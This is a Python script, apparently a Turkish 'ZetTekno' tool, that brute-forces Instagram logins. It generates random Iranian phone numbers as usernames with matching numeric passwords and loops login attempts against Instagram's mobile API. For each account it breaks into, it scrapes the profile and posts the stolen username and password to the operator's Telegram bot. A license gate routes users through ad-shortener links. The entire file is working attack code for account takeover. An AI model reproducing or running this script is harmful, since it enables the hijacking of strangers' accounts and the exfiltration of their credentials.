import os
import requests
import random,uuid,time,secrets
from uuid import uuid4
os.system("clear")
kirmizi="\033[1;31m"
yeşil="\033[1;32m"
beyaz="\033[0m"
olu=0
hit=0

linkler=("https://ay.live/QKvWEK","https://ay.live/yjas","https://ay.live/fdx530","https://ay.live/Edey")
link = str(''.join((random.choice(linkler) for i in range(1))))
if link == "https://ay.live/Edey":
    lisans="KarderBoşŞeydir"
if link == "https://ay.live/fdx530":
    lisans="YallahBismillah"
if link == "https://ay.live/WUSC4":
    lisans="CodedYusiqo"
if link == "https://ay.live/yjas":
    lisans="MüqTool"
if link == "https://ay.live/QKvWEK":
    lisans="ZetTekno Kraldır"
def clear():
    os.system("clear")
def info(user2,pasw):
    global tele,myadmin,mess
    cookie = secrets.token_hex(8)*2
    headr = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"}
    url2 = f'https://www.instagram.com/{user2}/?__a=1'
    ree = requests.get(url2,headers=headr).json()
    name = str(ree['graphql']['user']['full_name'])
    id = str(ree['graphql']['user']['id'])
    followes = str(ree['graphql']['user']['edge_followed_by']['count'])
    following = str(ree['graphql']['user']['edge_follow']['count'])
    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
    ree = re.json()
    datee = ree['data']
    ms = f"""
𖣘  Made By ZetTekno Team
═───────◇───────═
❶➾ User : {user2}
❷➾ Name : {name}
❸➾ Pasw : {pasw} 
❹➾ Followers : {followes}
❺➾ Following : {following}
❻➾ Date : {datee}
 ═───────◇───────═
⊱ Sadece ZetTekno Üyeleri İçin ⊰ """
    requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""")
    hit += 1
def banner():
    print("""\033[1;31;40m
    _______________________________________
    
              ______________                               
        ,===:'.,            `-._                           
             `:.`---.__         `-._                       
            `:.     `--.         `.                     
                 \.        `.         `.                   
         (,,(,    \.         `.   ____,-`.,                
      (,'     `/   \.   ,--.___`.'                         
  ,  ,'  ,--.  `,   \.;'         `                         
   `{D, {    \  :    \;                                    
     V,,'    /  /    //                                    
     j;;    /  ,' ,-//.    ,---.      ,                    
     \;'   /  ,' /  _  \  /  _  \   ,'/                    
           \   `'  / \  `'  / \  `.' /                     
            `.___,'   `.__,'   `.__,'
    
    _______________________________________
    \033[0m """)
    print("""
    Coded By: @Yusiqo
    Channel: @ZetTekno
    Kader Sadece Bahanedir.....
    """)
    print("\033[1;31;40m    _______________________________________\033[0m")
    print("""
    """)
def startss():
    os.system("clear")
    banner()
    myadmin=input("\033[0;33mTelegram ID Gir: \033[0m")
    tele=input("\033[0;33mToken Gir: \033[0m")
    def start():
        toplam=0
        hit=0
        olu=0
        while True:
            chars = '123456789'
            u = '913'
            u1 = str("". join(random.choice(chars)for i in range(7)))
            u2 = str("". join(random.choice(u)for i in range(1)))
            user = '+98'+u+u1
            pasw = u+u1
            url = 'https://i.instagram.com/api/v1/accounts/login/'          
            headers = {'User-Agent': 'User-Agent: Instagram 13.0.0.7.199 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
                 'Cookie':'missing', 
                 'Accept-Encoding':'gzip', 
                 'Accept-Language':'fr-FR, en-US', 
                 'X-IG-Capabilities':'AQ==', 
                 'X-IG-Connection-Type':'MOBILE(HSPA+)', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
            uid = str(uuid4())
            data = {
            	'uuid':uid,'password':pasw, 
                 'username':user, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
            req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
            if 'logged_in_user' in req_login.text:
                user2 = req_login.json()['logged_in_user']['username']
                info(user2,pasw)
            elif '"message":"challenge_required","challenge"' in req_login.text:
                pass
            else:
                toplam += 1
                olu += 1
                clear()
                banner()
                print(f""+kirmizi+f"⌯ Yanlış Hesap -->  {user}:{pasw} Toplam: {toplam} Ölü: {olu} Hit: {hit}"+beyaz+f"")
    start()
clear()
banner()
try:
    f = open("key","r")
except:
    f = open("key","w")
f = open("key","r")
anahtar=(f.read())
if anahtar == "Lisans= Active":
    startss()
else:
    clear()
    banner()
    keys= link
    print(f"Lisans Linki: {keys}")
    keyim=input("Giriş Kodunu Giriniz : ")
    if keyim == lisans:
        f = open("key", "w")
        f.write("Lisans= Active")
        f.close()
        startss()
    else:
        clear()
        print("Lisans Kodu Yanlış")
        quit()
